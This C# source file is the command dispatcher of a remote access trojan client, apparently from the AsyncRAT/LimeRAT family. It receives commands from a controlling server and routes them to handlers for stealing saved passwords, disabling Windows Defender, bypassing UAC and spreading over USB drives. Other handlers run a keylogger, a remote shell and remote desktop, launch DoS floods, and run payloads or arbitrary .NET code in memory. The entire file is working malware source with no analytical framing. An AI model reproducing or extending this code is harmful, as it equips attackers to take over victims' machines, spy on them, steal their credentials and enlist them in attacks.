using Client.Helper;
using Client.MessagePack;
using Client.Sockets;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    public static class Packet
    {
        public static CancellationTokenSource ctsDos;
        public static CancellationTokenSource ctsReportWindow;
        public static FormChat GetFormChat;

        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }

                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                            break;
                        }


                    case "thumbnails":
                        {
                            new HandleThumbnails();
                            break;
                        }

                    case "sendFile":
                        {
                            Received();
                            new HandleSendTo().SendToDisk(unpack_msgpack);
                            break;
                        }

                    case "sendMemory":
                        {
                            Received();
                            new HandleSendTo().SendToMemory(unpack_msgpack);
                            break;
                        }

                    case "recoveryPassword":
                        {
                            Received();
                            new HandlerRecovery(unpack_msgpack);
                            break;
                        }

                    case "defender":
                        {
                            new HandleWindowsDefender();
                            break;
                        }

                    case "uac":
                        {
                            new HandleUAC();
                            break;
                        }

                    case "close":
                        {
                            Methods.ClientExit();
                            Environment.Exit(0);
                            break;
                        }

                    case "restart":
                        {
                            Process.Start(Application.ExecutablePath);
                            Methods.ClientExit();
                            Environment.Exit(0);
                            break;
                        }

                    case "uninstall":
                        {
                            new HandleUninstall();
                            break;
                        }

                    case "usbSpread":
                        {
                            new HandleLimeUSB(unpack_msgpack);
                            break;
                        }

                    case "remoteDesktop":
                        {
                            new HandleRemoteDesktop(unpack_msgpack);
                            break;
                        }

                    case "processManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "List":
                                    {
                                        new HandleProcessManager().ProcessList();
                                        break;
                                    }

                                case "Kill":
                                    {
                                        new HandleProcessManager().ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                        break;
                                    }
                            }
                        }
                        break;

                    case "fileManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
                            {
                                case "getDrivers":
                                    {
                                        new FileManager().GetDrivers();
                                        break;
                                    }

                                case "getPath":
                                    {
                                        new FileManager().GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                                        break;
                                    }

                                case "uploadFile":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                                        if (File.Exists(fullPath))
                                        {
                                            File.Delete(fullPath);
                                            Thread.Sleep(500);
                                        }
                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                                        break;
                                    }

                                case "reqUploadFile":
                                    {
                                        new FileManager().ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString); ;
                                        break;
                                    }

                                case "deleteFile":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                        File.Delete(fullPath);
                                        break;
                                    }

                                case "execute":
                                    {
                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                                        Process.Start(fullPath);
                                        break;
                                    }
                            }
                        }
                        break;

                    case "socketDownload":
                        {
                            new FileManager().DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("DWID").AsString);
                            break;
                        }

                    case "botKiller":
                        {
                            new HandleBotKiller().RunBotKiller();
                            break;
                        }

                    case "keyLogger":
                        {
                            FileManager fileManager = new FileManager();
                            string isON = unpack_msgpack.ForcePathObject("isON").AsString;
                            if (isON == "true")
                            {
                                new Thread(() =>
                                {
                                    HandleLimeLogger.isON = true;
                                    HandleLimeLogger.Run();
                                }).Start();
                            }
                            else
                            {
                                HandleLimeLogger.isON = false;
                            }
                            break;
                        }

                    case "visitURL":
                        {
                            string url = unpack_msgpack.ForcePathObject("URL").AsString;
                            if (url.StartsWith("http"))
                            {
                                Process.Start(url);
                            }
                            break;
                        }

                    case "dos":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "postStart":
                                    {
                                        ctsDos = new CancellationTokenSource();
                                        new HandleDos().DosPost(unpack_msgpack);
                                        break;
                                    }

                                case "postStop":
                                    {
                                        ctsDos.Cancel();
                                        break;
                                    }
                            }
                            break;
                        }

                    case "shell":
                        {
                            HandleShell.StarShell();
                            break;
                        }

                    case "shellWriteInput":
                        {
                            if (HandleShell.ProcessShell != null)
                                HandleShell.ShellWriteLine(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                            break;
                        }

                    case "chat":
                        {
                            new HandlerChat().CreateChat();
                            break;
                        }

                    case "chatWriteInput":
                        {
                            new HandlerChat().WriteInput(unpack_msgpack);
                            break;
                        }

                    case "chatExit":
                        {
                            new HandlerChat().ExitChat();
                            break;
                        }

                    case "pcOptions":
                        {
                            new HandlePcOptions(unpack_msgpack.ForcePathObject("Option").AsString);
                            break;
                        }

                    case "reportWindow":
                        {
                            new HandleReportWindow(unpack_msgpack);
                            break;
                        }


                    case "torrent":
                        {
                            new HandleTorrent(unpack_msgpack);
                            break;
                        }

                    case "executeDotNetCode":
                        {
                            new HandlerExecuteDotNetCode(unpack_msgpack);
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Received()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            ClientSocket.Send(msgpack.Encode2Bytes());
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            ClientSocket.Send(msgpack.Encode2Bytes());
        }

    }
}
